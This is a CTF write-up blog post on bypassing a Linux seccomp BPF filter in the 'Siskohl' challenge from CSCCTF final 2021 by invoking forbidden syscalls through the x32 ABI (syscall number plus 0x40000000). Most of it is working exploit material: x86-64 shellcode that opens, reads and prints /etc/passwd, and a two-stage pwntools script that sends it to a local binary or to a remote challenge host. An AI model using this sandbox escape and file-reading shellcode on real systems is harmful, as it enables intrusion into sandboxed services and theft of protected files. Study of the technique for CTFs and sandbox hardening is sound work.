---
layout: post
title:  "Bypassing seccomp BPF filter"
date:   2021-07-12
categories: ctf
description: Seccomp is a computer security facility in the Linux kernel.
tags: tip-binary ctf
---

# Objective

In this post, I will explain how to bypass seccomp by access the `x32` syscall ABI. 
It will work even if the seccomp is checking the current architecture. I will use 
the `Siskohl` sandbox challenge from CSCCTF final 2021 and try to use a forbidden syscall. 
the binary doesn’t use libseccomp instead it uses bpf seccomp

# Seccomp info file

to examine which syscall is not allowed you can use `seccomp-tools` here is the seccomp 
information from the binary

<img src="/images/bypass-seccomp/seccomp.png">

as you can see, we can't use those syscalls and the filter checks the current architecture. 
so we can't bypass it by switching to 32-bit mode. in this post, I will try to use the `x32` syscall 
ABI and use `open`, `read`, and `write` syscall.
for example, I will try to see a file content inside `/etc/passwd`

# Bypass seccomp filter

we can use `0x40000000` to bypass the filter, in order to call a forbidden syscall you can adding 
the syscall number with 0x40000000, so our shellcode will look like:

{% highlight C %}
; open(0x0000000000404000, 0, 0) 0x0000000000404000 = path of the file we want to read
mov rax, 0x40000002
mov rdi, 0x0000000000404000
mov rsi, 0
mov rdx, 0
syscall

; read(path, 0x0000000000404000, 0x100) 
mov rdi, rax
mov rax, 0x40000000
mov rsi, 0x0000000000404000
mov rdx, 0x100
syscall

; write(1, 0x0000000000404000, 0x100) 
mov rax, 0x40000001
mov rdi, 1
mov rsi, 0x0000000000404000
mov rdx, 0x100
syscall
{% endhighlight %}

# Exploit

{% highlight python %}
#!/usr/bin/env python2
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",
               terminal=["tmux", "split-window", "-v", "-p 85"],)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("/home/ctf/ctfs/2021/cscctf-final/pwn/siskohl/siskohl")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = ["* 0x401449"]
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    # attach(r)
    rw = 0x0000000000404000

    # stage 1
    setsyscall = '''
    mov r13, rdx

    mov rdi, 0x0000000000404000
    mov rsi, 0x68732f6e69622f2f
    mov [rdi+0], rsi

    mov rax, 0x40000000
    mov rsi, r13
    add rsi, 0x4a
    mov rdi, 0
    mov rdx, 1000

    mov r14, r13
    add r14, 0x48
    mov r15,  0x050e
    add r15, 1
    mov [r14+0], r15
    '''
    sh = asm(setsyscall)
    print len(sh)
    r.sendline(sh)

    # stage 2
    shellcode =  '''
    

    mov r12, 0x0000000000404000
    mov rcx, 0x7361702f6374652f
    mov rdx, 0x0000000000647773
    mov [r12+0], rcx
    mov [r12+8], rdx

    mov rax, 0x40000002
    mov rdi, 0x0000000000404000
    mov rsi, 0
    mov rdx, 0
    syscall

    mov rdi, rax
    mov rax, 0x40000000
    mov rsi, 0x0000000000404000
    mov rdx, 0x100
    syscall

    mov rax, 0x40000001
    mov rdi, 1
    mov rsi, 0x0000000000404000
    mov rdx, 0x100
    syscall
    '''
    r.sendline(asm(shellcode))
    r.interactive()
    return

if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("188.166.177.88", 13377)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)

{% endhighlight %}
